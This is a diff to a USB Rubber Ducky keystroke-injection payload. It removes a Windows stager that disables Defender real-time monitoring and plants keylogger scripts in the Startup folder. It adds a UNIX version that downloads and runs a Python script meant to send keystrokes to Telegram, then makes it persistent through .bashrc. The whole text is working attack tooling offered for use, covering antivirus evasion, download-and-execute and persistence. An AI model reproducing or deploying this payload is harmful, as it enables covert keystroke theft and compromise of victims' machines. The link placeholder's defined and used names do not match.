@@ -1,31 +1,16 @@
-REM Powershell Keylogger for the USB RubberDucky
+REM Persistent Keylogger that sends to Telegram on UNIX machines
+REM Target: UNIX
 
-REM STAGE1
-REM open runbox
+REM Requirements: internet connection
+REM put link to script
+DEFINE #PYTHON_SCRIPT-LINK https://www.
+
 DELAY 1000
-GUI r
-DELAY 200
-STRING powershell
-ENTER
-DELAY 300
+CTRL-ALT t
+DELAY 2000
 
-REM STAGE2
-REM attempts to disable defender
-STRING Set-MpPreference -DisableRealtimeMonitoring $true;
-
-REM STAGE 3
-REM move files to appropiate directories
-REM change 'L' to the name of your ducky
-STRING $u=gwmi Win32_Volume|?{$_.Label -eq'E:\'}|select name;cd $u.name;cp .\p.ps1 $env:temp;cp .\l.ps1 $env:temp;cp .\c.cmd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";cd $env:temp;echo "">"$env:UserName.log";
-ENTER
-DELAY 200
-
-REM comment out the option you decide NOT to use
-
-REM STAGE 4 
-REM run keylogger
-STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";.\c.cmd;exit
-
-REM STAGE 5
-REM deploy
-ENTER
+STRINGLN_BLOCK
+	curl -o connection.py #PYTHON-SCRIPT-LINK; python3 connection.py; echo "if ! pgrep -f connection.py >/dev/null; then
+  python3 connection.py & 
+  fi" >> .bashrc; exit
+END_STRINGLN
